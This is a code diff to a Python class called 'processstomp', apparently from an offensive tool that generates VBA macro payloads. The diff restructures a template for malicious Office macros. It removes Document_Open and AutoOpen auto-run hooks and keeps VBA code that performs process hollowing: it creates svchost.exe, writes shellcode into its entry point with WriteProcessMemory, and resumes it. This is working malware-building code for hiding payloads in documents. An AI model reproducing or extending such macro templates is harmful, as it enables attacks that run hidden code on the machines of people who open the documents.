@@ -19,10 +19,8 @@ class processstomp:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
+    def codeblocks(self) -> str:
         return """
-{imports}
-
 Private Type PROCESS_BASIC_INFORMATION
     Reserved1 As LongPtr
     PebAddress As LongPtr
@@ -59,19 +57,10 @@ Private Type PROCESS_INFORMATION
     dwProcessId As Long
     dwThreadId As Long
 End Type
+"""
 
-Sub Document_Open()
-    hollow
-End Sub
-
-Sub AutoOpen()
-    hollow
-End Sub
-
-{codeblocks}
-
-' Performs process hollowing to run shellcode in svchost.exe
-Function hollow()
+    def template(self) -> str:
+        return """
     Dim si As STARTUPINFOA
     RtlZeroMemory si, Len(si)
     si.cb = Len(si)
@@ -143,6 +132,4 @@ Function hollow()
     a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
     ' Resume svchost.exe process to run the shellcode
     b = ResumeThread(pi.hThread)
- 
-End Function
 """
